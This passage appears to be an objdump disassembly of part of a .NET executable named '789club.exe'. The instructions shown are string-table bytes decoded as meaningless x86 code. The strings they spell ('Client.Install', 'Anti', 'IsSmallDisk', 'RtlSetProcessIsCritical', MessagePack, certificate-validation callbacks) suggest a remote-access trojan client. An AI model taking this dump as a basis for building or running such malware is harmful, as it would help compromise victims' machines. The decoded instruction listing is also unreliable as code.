  4081fd:	62 65 72             	bound  %esp,0x72(%ebp)
  408200:	41                   	inc    %ecx
  408201:	74 74                	je     0x408277
  408203:	72 69                	jb     0x40826e
  408205:	62 75 74             	bound  %esi,0x74(%ebp)
  408208:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820c:	6d                   	insl   (%dx),%es:(%edi)
  40820d:	70 69                	jo     0x408278
  40820f:	6c                   	insb   (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	74 69                	je     0x40827c
  408213:	6f                   	outsl  %ds:(%esi),(%dx)
  408214:	6e                   	outsb  %ds:(%esi),(%dx)
  408215:	52                   	push   %edx
  408216:	65 6c                	gs insb (%dx),%es:(%edi)
  408218:	61                   	popa
  408219:	78 61                	js     0x40827c
  40821b:	74 69                	je     0x408286
  40821d:	6f                   	outsl  %ds:(%esi),(%dx)
  40821e:	6e                   	outsb  %ds:(%esi),(%dx)
  40821f:	73 41                	jae    0x408262
  408221:	74 74                	je     0x408297
  408223:	72 69                	jb     0x40828e
  408225:	62 75 74             	bound  %esi,0x74(%ebp)
  408228:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822c:	73 65                	jae    0x408293
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408233:	72 6f                	jb     0x4082a4
  408235:	64 75 63             	fs jne 0x40829b
  408238:	74 41                	je     0x40827b
  40823a:	74 74                	je     0x4082b0
  40823c:	72 69                	jb     0x4082a7
  40823e:	62 75 74             	bound  %esi,0x74(%ebp)
  408241:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408245:	73 65                	jae    0x4082ac
  408247:	6d                   	insl   (%dx),%es:(%edi)
  408248:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	70 79                	jo     0x4082c8
  40824f:	72 69                	jb     0x4082ba
  408251:	67 68 74 41 74 74    	addr16 push $0x74744174
  408257:	72 69                	jb     0x4082c2
  408259:	62 75 74             	bound  %esi,0x74(%ebp)
  40825c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408260:	73 65                	jae    0x4082c7
  408262:	6d                   	insl   (%dx),%es:(%edi)
  408263:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408267:	6f                   	outsl  %ds:(%esi),(%dx)
  408268:	6d                   	insl   (%dx),%es:(%edi)
  408269:	70 61                	jo     0x4082cc
  40826b:	6e                   	outsb  %ds:(%esi),(%dx)
  40826c:	79 41                	jns    0x4082af
  40826e:	74 74                	je     0x4082e4
  408270:	72 69                	jb     0x4082db
  408272:	62 75 74             	bound  %esi,0x74(%ebp)
  408275:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408279:	6e                   	outsb  %ds:(%esi),(%dx)
  40827a:	74 69                	je     0x4082e5
  40827c:	6d                   	insl   (%dx),%es:(%edi)
  40827d:	65 43                	gs inc %ebx
  40827f:	6f                   	outsl  %ds:(%esi),(%dx)
  408280:	6d                   	insl   (%dx),%es:(%edi)
  408281:	70 61                	jo     0x4082e4
  408283:	74 69                	je     0x4082ee
  408285:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408288:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40828f:	69 
  408290:	62 75 74             	bound  %esi,0x74(%ebp)
  408293:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408297:	74 5f                	je     0x4082f8
  408299:	55                   	push   %ebp
  40829a:	73 65                	jae    0x408301
  40829c:	53                   	push   %ebx
  40829d:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a2:	78 65                	js     0x408309
  4082a4:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a7:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ab:	61                   	popa
  4082ac:	64 42                	fs inc %edx
  4082ae:	79 74                	jns    0x408324
  4082b0:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b4:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bb:	00 
  4082bc:	44                   	inc    %esp
  4082bd:	65 6c                	gs insb (%dx),%es:(%edi)
  4082bf:	65 74 65             	gs je  0x408327
  4082c2:	56                   	push   %esi
  4082c3:	61                   	popa
  4082c4:	6c                   	insb   (%dx),%es:(%edi)
  4082c5:	75 65                	jne    0x40832c
  4082c7:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cb:	65 72 56             	gs jb  0x408324
  4082ce:	61                   	popa
  4082cf:	6c                   	insb   (%dx),%es:(%edi)
  4082d0:	75 65                	jne    0x408337
  4082d2:	00 47 65             	add    %al,0x65(%edi)
  4082d5:	74 56                	je     0x40832d
  4082d7:	61                   	popa
  4082d8:	6c                   	insb   (%dx),%es:(%edi)
  4082d9:	75 65                	jne    0x408340
  4082db:	00 53 65             	add    %dl,0x65(%ebx)
  4082de:	74 56                	je     0x408336
  4082e0:	61                   	popa
  4082e1:	6c                   	insb   (%dx),%es:(%edi)
  4082e2:	75 65                	jne    0x408349
  4082e4:	00 76 61             	add    %dh,0x61(%esi)
  4082e7:	6c                   	insb   (%dx),%es:(%edi)
  4082e8:	75 65                	jne    0x40834f
  4082ea:	00 67 65             	add    %ah,0x65(%edi)
  4082ed:	74 5f                	je     0x40834e
  4082ef:	4b                   	dec    %ebx
  4082f0:	65 65 70 41          	gs gs jo 0x408335
  4082f4:	6c                   	insb   (%dx),%es:(%edi)
  4082f5:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fc:	5f                   	pop    %edi
  4082fd:	4b                   	dec    %ebx
  4082fe:	65 65 70 41          	gs gs jo 0x408343
  408302:	6c                   	insb   (%dx),%es:(%edi)
  408303:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830a:	6f                   	outsl  %ds:(%esi),(%dx)
  40830b:	76 65                	jbe    0x408372
  40830d:	00 37                	add    %dh,(%edi)
  40830f:	38 39                	cmp    %bh,(%ecx)
  408311:	63 6c 75 62          	arpl   %ebp,0x62(%ebp,%esi,2)
  408315:	2e 65 78 65          	cs js,pn 0x40837e
  408319:	00 73 65             	add    %dh,0x65(%ebx)
  40831c:	74 5f                	je     0x40837d
  40831e:	42                   	inc    %edx
  40831f:	6c                   	insb   (%dx),%es:(%edi)
  408320:	6f                   	outsl  %ds:(%esi),(%dx)
  408321:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408324:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832b:	5f                   	pop    %edi
  40832c:	54                   	push   %esp
  40832d:	6f                   	outsl  %ds:(%esi),(%dx)
  40832e:	74 61                	je     0x408391
  408330:	6c                   	insb   (%dx),%es:(%edi)
  408331:	53                   	push   %ebx
  408332:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408339:	5f                   	pop    %edi
  40833a:	48                   	dec    %eax
  40833b:	65 61                	gs popa
  40833d:	64 65 72 53          	fs gs jb 0x408394
  408341:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408348:	5f                   	pop    %edi
  408349:	48                   	dec    %eax
  40834a:	65 61                	gs popa
  40834c:	64 65 72 53          	fs gs jb 0x4083a3
  408350:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408357:	5f                   	pop    %edi
  408358:	53                   	push   %ebx
  408359:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835b:	64 42                	fs inc %edx
  40835d:	75 66                	jne    0x4083c5
  40835f:	66 65 72 53          	data16 gs jb 0x4083b6
  408363:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40836a:	5f                   	pop    %edi
  40836b:	52                   	push   %edx
  40836c:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408370:	76 65                	jbe    0x4083d7
  408372:	42                   	inc    %edx
  408373:	75 66                	jne    0x4083db
  408375:	66 65 72 53          	data16 gs jb 0x4083cc
  408379:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408380:	5f                   	pop    %edi
  408381:	4b                   	dec    %ebx
  408382:	65 79 53             	gs jns 0x4083d8
  408385:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  40838c:	65 78 4f             	gs js  0x4083de
  40838f:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408393:	72 46                	jb     0x4083db
  408395:	6c                   	insb   (%dx),%es:(%edi)
  408396:	61                   	popa
  408397:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839b:	79 70                	jns    0x40840d
  40839d:	74 6f                	je     0x40840e
  40839f:	43                   	inc    %ebx
  4083a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a2:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a8:	74 5f                	je     0x408409
  4083aa:	50                   	push   %eax
  4083ab:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b2:	5f                   	pop    %edi
  4083b3:	50                   	push   %eax
  4083b4:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083bb:	74 65                	je     0x408422
  4083bd:	6d                   	insl   (%dx),%es:(%edi)
  4083be:	2e 54                	cs push %esp
  4083c0:	68 72 65 61 64       	push   $0x64616572
  4083c5:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083cc:	5f                   	pop    %edi
  4083cd:	50                   	push   %eax
  4083ce:	61                   	popa
  4083cf:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d6:	64 64 
  4083d8:	5f                   	pop    %edi
  4083d9:	53                   	push   %ebx
  4083da:	65 73 73             	gs jae 0x408450
  4083dd:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e5:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e9:	73 74                	jae    0x40845f
  4083eb:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ed:	45                   	inc    %ebp
  4083ee:	76 65                	jbe    0x408455
  4083f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f1:	74 73                	je     0x408466
  4083f3:	5f                   	pop    %edi
  4083f4:	53                   	push   %ebx
  4083f5:	65 73 73             	gs jae 0x40846b
  4083f8:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408400:	67 00 55 54          	add    %dl,0x54(%di)
  408404:	46                   	inc    %esi
  408405:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408408:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840b:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408412:	74 65                	je     0x408479
  408414:	6d                   	insl   (%dx),%es:(%edi)
  408415:	2e 44                	cs inc %esp
  408417:	72 61                	jb     0x40847a
  408419:	77 69                	ja     0x408484
  40841b:	6e                   	outsb  %ds:(%esi),(%dx)
  40841c:	67 2e 49             	addr16 cs dec %ecx
  40841f:	6d                   	insl   (%dx),%es:(%edi)
  408420:	61                   	popa
  408421:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408428:	73 
  408429:	74 65                	je     0x408490
  40842b:	6d                   	insl   (%dx),%es:(%edi)
  40842c:	2e 52                	cs push %edx
  40842e:	75 6e                	jne    0x40849e
  408430:	74 69                	je     0x40849b
  408432:	6d                   	insl   (%dx),%es:(%edi)
  408433:	65 2e 56             	gs cs push %esi
  408436:	65 72 73             	gs jb  0x4084ac
  408439:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408440:	46                   	inc    %esi
  408441:	72 6f                	jb     0x4084b2
  408443:	6d                   	insl   (%dx),%es:(%edi)
  408444:	42                   	inc    %edx
  408445:	61                   	popa
  408446:	73 65                	jae    0x4084ad
  408448:	36 34 53             	ss xor $0x53,%al
  40844b:	74 72                	je     0x4084bf
  40844d:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408454:	61                   	popa
  408455:	73 65                	jae    0x4084bc
  408457:	36 34 53             	ss xor $0x53,%al
  40845a:	74 72                	je     0x4084ce
  40845c:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408463:	64 53                	fs push %ebx
  408465:	74 72                	je     0x4084d9
  408467:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846e:	6e                   	outsb  %ds:(%esi),(%dx)
  40846f:	6c                   	insb   (%dx),%es:(%edi)
  408470:	6f                   	outsl  %ds:(%esi),(%dx)
  408471:	61                   	popa
  408472:	64 53                	fs push %ebx
  408474:	74 72                	je     0x4084e8
  408476:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40847d:	74 65                	je     0x4084e4
  40847f:	53                   	push   %ebx
  408480:	74 72                	je     0x4084f4
  408482:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408489:	74 72                	je     0x4084fd
  40848b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408492:	5f                   	pop    %edi
  408493:	41                   	inc    %ecx
  408494:	73 53                	jae    0x4084e9
  408496:	74 72                	je     0x40850a
  408498:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40849f:	5f                   	pop    %edi
  4084a0:	41                   	inc    %ecx
  4084a1:	73 53                	jae    0x4084f6
  4084a3:	74 72                	je     0x408517
  4084a5:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084ac:	65 73 41             	gs jae 0x4084f0
  4084af:	73 53                	jae    0x408504
  4084b1:	74 72                	je     0x408525
  4084b3:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084ba:	41                   	inc    %ecx
  4084bb:	73 53                	jae    0x408510
  4084bd:	74 72                	je     0x408531
  4084bf:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c6:	41                   	inc    %ecx
  4084c7:	73 53                	jae    0x40851c
  4084c9:	74 72                	je     0x40853d
  4084cb:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d2:	53                   	push   %ebx
  4084d3:	74 72                	je     0x408547
  4084d5:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084dc:	65 73 41             	gs jae 0x408520
  4084df:	73 48                	jae    0x408529
  4084e1:	65 78 53             	gs js  0x408537
  4084e4:	74 72                	je     0x408558
  4084e6:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084ed:	73 74                	jae    0x408563
  4084ef:	72 69                	jb     0x40855a
  4084f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f2:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f6:	73 74                	jae    0x40856c
  4084f8:	65 6d                	gs insl (%dx),%es:(%edi)
  4084fa:	2e 44                	cs inc %esp
  4084fc:	72 61                	jb     0x40855f
  4084fe:	77 69                	ja     0x408569
  408500:	6e                   	outsb  %ds:(%esi),(%dx)
  408501:	67 00 67 65          	add    %ah,0x65(%bx)
  408505:	74 5f                	je     0x408566
  408507:	41                   	inc    %ecx
  408508:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40850c:	61                   	popa
  40850d:	74 65                	je     0x408574
  40850f:	50                   	push   %eax
  408510:	6f                   	outsl  %ds:(%esi),(%dx)
  408511:	6e                   	outsb  %ds:(%esi),(%dx)
  408512:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408516:	74 5f                	je     0x408577
  408518:	41                   	inc    %ecx
  408519:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40851d:	61                   	popa
  40851e:	74 65                	je     0x408585
  408520:	50                   	push   %eax
  408521:	6f                   	outsl  %ds:(%esi),(%dx)
  408522:	6e                   	outsb  %ds:(%esi),(%dx)
  408523:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408527:	74 5f                	je     0x408588
  408529:	45                   	inc    %ebp
  40852a:	72 72                	jb     0x40859e
  40852c:	6f                   	outsl  %ds:(%esi),(%dx)
  40852d:	72 44                	jb     0x408573
  40852f:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408536:	73 67                	jae    0x40859f
  408538:	00 43 6f             	add    %al,0x6f(%ebx)
  40853b:	6d                   	insl   (%dx),%es:(%edi)
  40853c:	70 75                	jo     0x4085b3
  40853e:	74 65                	je     0x4085a5
  408540:	48                   	dec    %eax
  408541:	61                   	popa
  408542:	73 68                	jae    0x4085ac
  408544:	00 73 74             	add    %dh,0x74(%ebx)
  408547:	72 54                	jb     0x40859d
  408549:	6f                   	outsl  %ds:(%esi),(%dx)
  40854a:	48                   	dec    %eax
  40854b:	61                   	popa
  40854c:	73 68                	jae    0x4085b6
  40854e:	00 47 65             	add    %al,0x65(%edi)
  408551:	74 48                	je     0x40859b
  408553:	61                   	popa
  408554:	73 68                	jae    0x4085be
  408556:	00 56 65             	add    %dl,0x65(%esi)
  408559:	72 69                	jb     0x4085c4
  40855b:	66 79 48             	data16 jns 0x4085a6
  40855e:	61                   	popa
  40855f:	73 68                	jae    0x4085c9
  408561:	00 46 6c             	add    %al,0x6c(%esi)
  408564:	75 73                	jne    0x4085d9
  408566:	68 00 67 65 74       	push   $0x74656700
  40856b:	5f                   	pop    %edi
  40856c:	45                   	inc    %ebp
  40856d:	78 65                	js     0x4085d4
  40856f:	63 75 74             	arpl   %esi,0x74(%ebp)
  408572:	61                   	popa
  408573:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408577:	61                   	popa
  408578:	74 68                	je     0x4085e2
  40857a:	00 47 65             	add    %al,0x65(%edi)
  40857d:	74 54                	je     0x4085d3
  40857f:	65 6d                	gs insl (%dx),%es:(%edi)
  408581:	70 50                	jo     0x4085d3
  408583:	61                   	popa
  408584:	74 68                	je     0x4085ee
  408586:	00 70 61             	add    %dh,0x61(%eax)
  408589:	74 68                	je     0x4085f3
  40858b:	00 48 6d             	add    %cl,0x6d(%eax)
  40858e:	61                   	popa
  40858f:	63 53 68             	arpl   %edx,0x68(%ebx)
  408592:	61                   	popa
  408593:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408599:	67 74 68             	addr16 je 0x408604
  40859c:	00 67 65             	add    %ah,0x65(%edi)
  40859f:	74 5f                	je     0x408600
  4085a1:	4c                   	dec    %esp
  4085a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a4:	67 74 68             	addr16 je 0x40860f
  4085a7:	00 49 76             	add    %cl,0x76(%ecx)
  4085aa:	4c                   	dec    %esp
  4085ab:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085ad:	67 74 68             	addr16 je 0x408618
  4085b0:	00 41 75             	add    %al,0x75(%ecx)
  4085b3:	74 68                	je     0x40861d
  4085b5:	4b                   	dec    %ebx
  4085b6:	65 79 4c             	gs jns 0x408605
  4085b9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085bb:	67 74 68             	addr16 je 0x408626
  4085be:	00 55 72             	add    %dl,0x72(%ebp)
  4085c1:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c7:	00 6d 73             	add    %ch,0x73(%ebp)
  4085ca:	67 70 61             	addr16 jo 0x40862e
  4085cd:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d0:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d3:	6c                   	insb   (%dx),%es:(%edi)
  4085d4:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085db:	6f                   	outsl  %ds:(%esi),(%dx)
  4085dc:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085df:	4d                   	dec    %ebp
  4085e0:	65 73 73             	gs jae 0x408656
  4085e3:	61                   	popa
  4085e4:	67 65 50             	addr16 gs push %eax
  4085e7:	61                   	popa
  4085e8:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085eb:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f2:	61                   	popa
  4085f3:	67 65 50             	addr16 gs push %eax
  4085f6:	61                   	popa
  4085f7:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fa:	4d                   	dec    %ebp
  4085fb:	73 67                	jae    0x408664
  4085fd:	50                   	push   %eax
  4085fe:	61                   	popa
  4085ff:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408602:	41                   	inc    %ecx
  408603:	73 79                	jae    0x40867e
  408605:	6e                   	outsb  %ds:(%esi),(%dx)
  408606:	63 43 61             	arpl   %eax,0x61(%ebx)
  408609:	6c                   	insb   (%dx),%es:(%edi)
  40860a:	6c                   	insb   (%dx),%es:(%edi)
  40860b:	62 61 63             	bound  %esp,0x63(%ecx)
  40860e:	6b 00 52             	imul   $0x52,(%eax),%eax
  408611:	65 6d                	gs insl (%dx),%es:(%edi)
  408613:	6f                   	outsl  %ds:(%esi),(%dx)
  408614:	74 65                	je     0x40867b
  408616:	43                   	inc    %ebx
  408617:	65 72 74             	gs jb  0x40868e
  40861a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408621:	56                   	push   %esi
  408622:	61                   	popa
  408623:	6c                   	insb   (%dx),%es:(%edi)
  408624:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862b:	43 
  40862c:	61                   	popa
  40862d:	6c                   	insb   (%dx),%es:(%edi)
  40862e:	6c                   	insb   (%dx),%es:(%edi)
  40862f:	62 61 63             	bound  %esp,0x63(%ecx)
  408632:	6b 00 54             	imul   $0x54,(%eax),%eax
  408635:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40863c:	6c                   	insb   (%dx),%es:(%edi)
  40863d:	62 61 63             	bound  %esp,0x63(%ecx)
  408640:	6b 00 75             	imul   $0x75,(%eax),%eax
  408643:	6e                   	outsb  %ds:(%esi),(%dx)
  408644:	70 61                	jo     0x4086a7
  408646:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408649:	6d                   	insl   (%dx),%es:(%edi)
  40864a:	73 67                	jae    0x4086b3
  40864c:	70 61                	jo     0x4086af
  40864e:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408651:	52                   	push   %edx
  408652:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408659:	4b 65 
  40865b:	79 50                	jns    0x4086ad
  40865d:	65 72 6d             	gs jb  0x4086cd
  408660:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408667:	68 65 63 6b 00       	push   $0x6b6365
  40866c:	46                   	inc    %esi
  40866d:	6c                   	insb   (%dx),%es:(%edi)
  40866e:	75 73                	jne    0x4086e3
  408670:	68 46 69 6e 61       	push   $0x616e6946
  408675:	6c                   	insb   (%dx),%es:(%edi)
  408676:	42                   	inc    %edx
  408677:	6c                   	insb   (%dx),%es:(%edi)
  408678:	6f                   	outsl  %ds:(%esi),(%dx)
  408679:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40867c:	49                   	dec    %ecx
  40867d:	73 53                	jae    0x4086d2
  40867f:	6d                   	insl   (%dx),%es:(%edi)
  408680:	61                   	popa
  408681:	6c                   	insb   (%dx),%es:(%edi)
  408682:	6c                   	insb   (%dx),%es:(%edi)
  408683:	44                   	inc    %esp
  408684:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868b:	6c                   	insb   (%dx),%es:(%edi)
  40868c:	00 66 56             	add    %ah,0x56(%esi)
  40868f:	61                   	popa
  408690:	6c                   	insb   (%dx),%es:(%edi)
  408691:	00 69 56             	add    %ch,0x56(%ecx)
  408694:	61                   	popa
  408695:	6c                   	insb   (%dx),%es:(%edi)
  408696:	00 73 74             	add    %dh,0x74(%ebx)
  408699:	72 56                	jb     0x4086f1
  40869b:	61                   	popa
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	00 52 74             	add    %dl,0x74(%edx)
  4086a0:	6c                   	insb   (%dx),%es:(%edi)
  4086a1:	53                   	push   %ebx
  4086a2:	65 74 50             	gs je  0x4086f5
  4086a5:	72 6f                	jb     0x408716
  4086a7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086aa:	73 49                	jae    0x4086f5
  4086ac:	73 43                	jae    0x4086f1
  4086ae:	72 69                	jb     0x408719
  4086b0:	74 69                	je     0x40871b
  4086b2:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b5:	00 50 72             	add    %dl,0x72(%eax)
  4086b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086bc:	73 43                	jae    0x408701
  4086be:	72 69                	jb     0x408729
  4086c0:	74 69                	je     0x40872b
  4086c2:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c5:	00 4e 65             	add    %cl,0x65(%esi)
  4086c8:	74 77                	je     0x408741
  4086ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cb:	72 6b                	jb     0x408738
  4086cd:	43                   	inc    %ebx
  4086ce:	72 65                	jb     0x408735
  4086d0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d3:	74 69                	je     0x40873e
  4086d5:	61                   	popa
  4086d6:	6c                   	insb   (%dx),%es:(%edi)
  4086d7:	00 53 79             	add    %dl,0x79(%ebx)
  4086da:	73 74                	jae    0x408750
  4086dc:	65 6d                	gs insl (%dx),%es:(%edi)
  4086de:	2e 53                	cs push %ebx
  4086e0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e4:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086eb:	6e 
  4086ec:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086ef:	61                   	popa
  4086f0:	6c                   	insb   (%dx),%es:(%edi)
  4086f1:	00 57 69             	add    %dl,0x69(%edi)
  4086f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f5:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f7:	77 73                	ja     0x40876c
  4086f9:	50                   	push   %eax
  4086fa:	72 69                	jb     0x408765
  4086fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fd:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408700:	61                   	popa
  408701:	6c                   	insb   (%dx),%es:(%edi)
  408702:	00 41 72             	add    %al,0x72(%ecx)
  408705:	65 45                	gs inc %ebp
  408707:	71 75                	jno    0x40877e
  408709:	61                   	popa
  40870a:	6c                   	insb   (%dx),%es:(%edi)
  40870b:	00 67 65             	add    %ah,0x65(%edi)
  40870e:	74 5f                	je     0x40876f
  408710:	49                   	dec    %ecx
  408711:	6e                   	outsb  %ds:(%esi),(%dx)
  408712:	74 65                	je     0x408779
  408714:	72 76                	jb     0x40878c
  408716:	61                   	popa
  408717:	6c                   	insb   (%dx),%es:(%edi)
  408718:	00 73 65             	add    %dh,0x65(%ebx)
  40871b:	74 5f                	je     0x40877c
  40871d:	49                   	dec    %ecx
  40871e:	6e                   	outsb  %ds:(%esi),(%dx)
  40871f:	74 65                	je     0x408786
  408721:	72 76                	jb     0x408799
  408723:	61                   	popa
  408724:	6c                   	insb   (%dx),%es:(%edi)
  408725:	00 43 6c             	add    %al,0x6c(%ebx)
  408728:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40872f:	73 74                	jae    0x4087a5
  408731:	61                   	popa
  408732:	6c                   	insb   (%dx),%es:(%edi)
  408733:	6c                   	insb   (%dx),%es:(%edi)
  408734:	00 6b 65             	add    %ch,0x65(%ebx)
  408737:	72 6e                	jb     0x4087a7
  408739:	65 6c                	gs insb (%dx),%es:(%edi)
  40873b:	33 32                	xor    (%edx),%esi
  40873d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408740:	6c                   	insb   (%dx),%es:(%edi)
  408741:	00 75 73             	add    %dh,0x73(%ebp)
  408744:	65 72 33             	gs jb  0x40877a
  408747:	32 2e                	xor    (%esi),%ch
  408749:	64 6c                	fs insb (%dx),%es:(%edi)
  40874b:	6c                   	insb   (%dx),%es:(%edi)
  40874c:	00 6e 74             	add    %ch,0x74(%esi)
  40874f:	64 6c                	fs insb (%dx),%es:(%edi)
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408755:	6c                   	insb   (%dx),%es:(%edi)
  408756:	00 4b 69             	add    %cl,0x69(%ebx)
  408759:	6c                   	insb   (%dx),%es:(%edi)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	00 50 6f             	add    %dl,0x6f(%eax)
  40875e:	6c                   	insb   (%dx),%es:(%edi)
  40875f:	6c                   	insb   (%dx),%es:(%edi)
  408760:	00 57 72             	add    %dl,0x72(%edi)
  408763:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  40876a:	00 
  40876b:	53                   	push   %ebx
  40876c:	65 74 41             	gs je  0x4087b0
  40876f:	73 4e                	jae    0x4087bf
